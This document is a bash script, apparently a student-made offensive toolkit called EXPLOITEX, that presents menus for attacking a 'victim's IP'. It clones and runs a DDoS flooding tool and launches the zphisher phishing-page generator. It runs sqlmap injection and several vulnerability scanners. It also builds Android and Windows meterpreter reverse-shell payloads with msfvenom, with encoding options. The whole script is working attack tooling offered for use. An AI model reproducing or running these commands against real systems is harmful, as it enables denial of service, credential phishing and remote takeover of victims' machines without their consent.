#!/bin/bash
cyan='\033[0;36m'
magenta='\033[0;35m'
blue='\033[0;34m'
red='\033[0;33m'
yellow='\033[0;31m'
green='\033[0;92m'
clear='\033[0m'
if [[ $USER == "root" ]]; then
clear
banner() {
echo -e " 
        ${green}******** **     ** *******  **         *******   ** **********${clear}
        ${green}/**///// //**   ** /**////**/**        **/////** /**/////**///${clear}
        ${green}/**       //** **  /**   /**/**       **     //**/**    /**${clear}   ${yellow}*****  **   **${clear}
        ${green}/*******   //***   /******* /**      /**      /**/**    /**${clear}  ${yellow}**///**//** **${clear}
        ${green}/**////     **/**  /**////  /**      /**      /**/**    /**${clear} ${yellow}/******* //***${clear}
        ${green}/**        ** //** /**      /**      //**     ** /**    /**${clear} ${yellow}/**////   **/**${clear}
        ${green}/******** **   //**/**      /******** //*******  /**    /**${clear} ${yellow}//****** ** //**${clear}
        ${green}//////// //     // //       ////////   ///////   //     //${clear}   ${yellow}////// //   //${clear}
                                                                                ${green}version 1.1${clear}
 ${green}Created by Adam and Tesfaberhan${clear}
"
}
banner                                                                                       
DDOSattack() {
clear
banner
    git clone https://github.com/palahsu/DDoS-Ripper.git > /dev/null 2>&1
    cd DDoS-Ripper
    clear
    banner
    echo -e "${green}[${clear}-${red}]${clear}   ${yellow}Victims IP:${clear}"
    read vip
    echo -e "${green}[${clear}-${red}]${clear}   ${yellow}Number of traffic to be sent:${clear}"
    read turbo
    echo -e "${green}[${clear}1${red}]${clear}   ${yellow}Use custom port (80):${clear}"
    echo -e "${green}[${clear}2${red}]${clear}   ${yellow}Use specific port:${clear}"
    read portoption
    if [[ $portoption == "1" ]]; then 
        python3 DRipper.py -s $vip -t $turbo | tail -n +16
    elif [[ $portoption == "2" ]]; then
        echo -e "${green}[${clear}-${red}]${clear}   ${yellow}Enter port:${clear}"
        read portno
        python3 DRipper.py -s $vip -p $portno -t $turbo | tail -n +16
    fi
}
echo -e "${green}[-]${clear}${yellow} do you want to install this tool? (y/n)${clear}

"
read -r options
if [[ $options == "y" ]]; then
	 #apt update >null 2>&1 
	#apt upgrade >null 2>&1
	#apt install nmap >null 2>&1
	#apt install metasploit-framework >null 2>&1
	#apt install git >null 2>&1
	#apt install wget >null 2>&1
	#apt install python >null 2>&1
	#apt install python2 >null 2>&1
	#sudo apt install set -y >null 2>&1
	#mkdir Exploit-payload
	#git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/ >null 2>&1
	#mv  setoolkit Exploit-payload
	#cd Exploit-payload/setoolkit
	#touch output.txt
	#cd setoolkit
	#pip3 install -r requirements.txt >null 2>&1
	#python setup.py >null 2>&1
	#apt install python3 >null 2>&1
options2() {
clear
banner
echo -e "${green}[${clear}-${green}]${clear}   ${yellow}options:${clear}
		"
		echo -e "${green}[${clear}1${green}]${clear}   ${yellow}Vulnerability Check:${clear}
		"
		echo -e "${green}[${clear}2${green}]${clear}   ${yellow}Exploit generator:${clear}
		"
		echo -e "${green}[${clear}3${green}]${clear}   ${yellow}exit:${clear}
		"
}
othertoolsvuln() {
clear
banner
			echo -e "
${green}[${clear}-${green}]${clear} ${yellow}options:${clear}
			
			"
			echo -e "
${green}[${clear}1${green}]${clear} ${yellow}open port scan:${clear}
			"
			echo -e "
${green}[${clear}2${green}]${clear} ${yellow}UDP scan:${clear}
			"
			echo -e "
${green}[${clear}3${green}]${clear} ${yellow}web vulnerability scan:${clear}
			"
			echo -e "
${green}[${clear}4${green}]${clear} ${yellow}comprehensive vulnerability scan:${clear}
			"
			echo -e "
${green}[${clear}5${green}]${clear} ${yellow}SSL/TLS vulnerability scan:${clear}
			"
			echo -e "
${green}[${clear}6${green}]${clear} ${yellow}Exploitex vuln scanner:${clear}
			"

			echo -e "
${green}[${clear}7${green}]${clear} ${yellow}exit:${clear}
			"
			read options3
		#open port scan
			if [[ $options3 == "1" ]]; then
	clear
			banner
				echo -e "${red}[${clear}-${red}]${clear} ${red}victims IP:${clear}
				
				"
				read victimips
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}Do you want to scan a specific port:(y/n)${clear}
				"
				read port
				if [[ $port == "y" ]]; then
					echo -e "
${green}[${clear}-${green}]${clear} ${red}port:${clear}
						"
					read port1
					nmap -p$port1 $victimips | tail -n +4 | head -n -2
				fi
				if [[ $port == "n" ]]; then
					nmap $victimips | tail -n +4 | head -n -2
				fi
			fi
		#UDP scan
			if [[ $options3 == "2" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} ${red}victims IP:${clear}
				"
				read victimips
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}Do you want to scan a specific port:(y/n)${clear}
				"
				read port
				if [[ $port == "y" ]]; then
					echo -e "
					${red}[${clear}-${red}]${clear} ${red}port:${clear}
					"
					read port1
					nmap -p$port1 -sU $victimips | tail -n +4 | head -n -2
				fi
				if [[ $port == "n" ]]; then
					nmap -p- -sU $victimips | tail -n +4 | head -n -2
				fi
			fi
		#web vuln scan
			if [[ $options3 == "3" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} {red}victims IP:${clear}
				"
				read victimips
				nikto -h $victimips -C all | tail -n +2
			fi
		#comp vuln scan
			if [[ $options3 == "4" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} ${green}victims IP:${clear}
				"
				read victimips
				openvas --target $victimips --user admin --password PASSWORD --scan 1
			fi
		#ssl/tls scan
			if [[ $options3 == "5" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} ${green}victims IP:${clear}
				"
				read victimips
				sslscan $victimips | tail -n +3 
			fi
}
exploitexvuln() {
clear
banner

		#exploitex vuln scanner
				echo -e "${green}[${clear}-${green}]${clear} ${yellow}Options:${clear}
					"
				echo -e "${green}[${clear}1${green}]${clear} ${yellow}Open port scanner:${clear}
				"
				#echo -e "
				#${red}[${clear}2${red}]${clear} ${yellow}UDP scanner:${clear}
				#"
				#echo -e "
				#${red}[${clear}3${red}]${clear} ${yellow}TCP scanner:${clear}
				#"
				#echo -e "${red}[${clear}2${red}]${clear} ${yellow}Web vulnerability scanner:${clear}
				#"
				echo -e "${green}[${clear}2${green}]${clear} ${yellow}Advanced web vulnerability scanner:${clear}
				"
				echo -e "${green}[${clear}3${green}]${clear} ${yellow}SSL/TLS scanner:${clear}
				"
				echo -e "${green}[${clear}4${green}]${clear} ${yellow}Exit:${clear}
				"
read options2
if [[ $options2 == "1" ]]; then
clear
banner
python3 port-scanner.py
#elif [[ $options2 == "2" ]]; then
#python3 web-vuln-scanner.py
elif [[ $options2 == "2" ]]; then
clear
banner
python3 web-vuln-scanner.py
elif [[ $options2 == "3" ]]; then
clear
banner
python3 ssl_tls.py
elif [[ $options2 == "4" ]]; then
clear
fi			
}
vulnerable() {
clear
banner
                                echo -e "${green}[${clear}-${green}]${clear} ${yellow}Options${clear}
				"

                                echo -e "${green}[${clear}1${green}]${clear} ${yellow}Exploitex vulnerability scanner${clear}
				"
                                echo -e "${green}[${clear}2${green}]${clear} ${yellow}Using other tools${clear}
				"

}
exp-phisher() {
clear
			cd /home/kali/Documents/
                        git clone --depth=1 https://github.com/htr-tech/zphisher.git 
                        cd zphisher
                        chmod +x zphisher.sh
                        ./zphisher.sh
}
sqlinject() {
clear
banner
echo -e "${green}[${clear}1${green}]${clear} ${yellow}Enter url:${clear}
				"
	read url
	sqlmap -u $url -g -p | tail -n +9
}
options2
		read options2
		if [[ $options2 == "1" ]]; then
vulnerable
read vulnoptions
if [[ $vulnoptions == "1" ]]; then
exploitexvuln
fi
if [[ $vulnoptions == "2" ]]; then
othertoolsvuln
fi
fi

				if [[ $options2 == "2" ]]; then
		echo -e "
${green}[${clear}-${green}]${clear} ${yellow}options:${clear}
		"
		echo -e "
${green}[${clear}01${green}]${clear} ${yellow}DDOS Attack:${clear}
		"
		echo -e "
${green}[${clear}02${green}]${clear} ${yellow}SQL Injections:${clear}
		"

		echo -e "
${green}[${clear}03${green}]${clear} ${yellow}Phishing web page generator:${clear}
		"
		echo -e "
${green}[${clear}04${green}]${clear} ${yellow}Malware Generator:${clear}
		"
		#echo -e "${green}[.]${clear} ${yellow}Exploitex Malware Generator [3]${clear}"
				read options3
		if [[ $options3 == "1" ]]; then		
		DDOSattack
		elif [[ $options3 == "2" ]]; then
		sqlinject		
		fi		
		if [[ $options3 == "3" ]]; then
exp-phisher
fi
		if [[ $options3 == "4" ]]; then
			echo -e "
${green}[${clear}-${green}]${clear} ${yellow}options${clear} :
			"
			echo -e "
${green}[${clear}01${green}]${clear} ${yellow}Android payload:${clear}
			"
			echo -e "
${green}[${clear}02${green}]${clear} ${yellow}windows payload:${clear}
			"
			read options4
				if [[ $options4 == "1" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} ${red}victim's IP:${clear}				
				
				"
				read victimips
				echo -e "
${green}[${clear}-${green}]${clear} ${red}victim's port:${clear}
				
				"
				read vport
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}where would you like to store it${clear}:
				
				"
				read dirt
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}what would you like to name it${clear}:
				
				"
				read mname
				msfvenom -p android/meterpreter/reverse_tcp e- ruby/base64 LHOST=$victimips LPORT=$vport R > $dirt/$mname.apk
				elif [[ $options4 == "2" ]]; then
				echo -e "
${green}[${clear}-${green}]${clear} ${red}victim's IP${clear}:
				
				"
				read victimips
				echo -e "
${green}[${clear}-${green}]${clear} ${red}victim's port${clear}:
				
				"
				read vport
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}where would you like to store it${clear}:
				
				"
				read dirt
				echo -e "
${green}[${clear}-${green}]${clear} ${yellow}what would you like to name it${clear}:
				
				"
				read mname
				msfvenom -p windows/meterpreter/reverse_tcp -e cmd/powershell_base64 LHOST=$victimips LPORT=$vport R > $dirt/$mname.exe
				fi
		fi
	fi
fi
if [[ $options == "n" ]]; then
    echo -e "${red}exitig ##########################"
    sleep 3
clear
fi
else
echo -e "${yellow}
#   #  ####  #    # #    # ###### ###### #####  #####  ####  #####  ###### #####   ####   ####  ##### 
 # #  #    # #    # ##   # #      #      #    #   #   #    # #    # #      #    # #    # #    #   #   
  #   #    # #    # # #  # #####  #####  #    #   #   #    # #####  #####  #    # #    # #    #   #   
  #   #    # #    # #  # # #      #      #    #   #   #    # #    # #      #####  #    # #    #   #   
  #   #    # #    # #   ## #      #      #    #   #   #    # #    # #      #   #  #    # #    #   #   
  #    ####   ####  #    # ###### ###### #####    #    ####  #####  ###### #    #  ####   ####    #   
${clear}"
fi
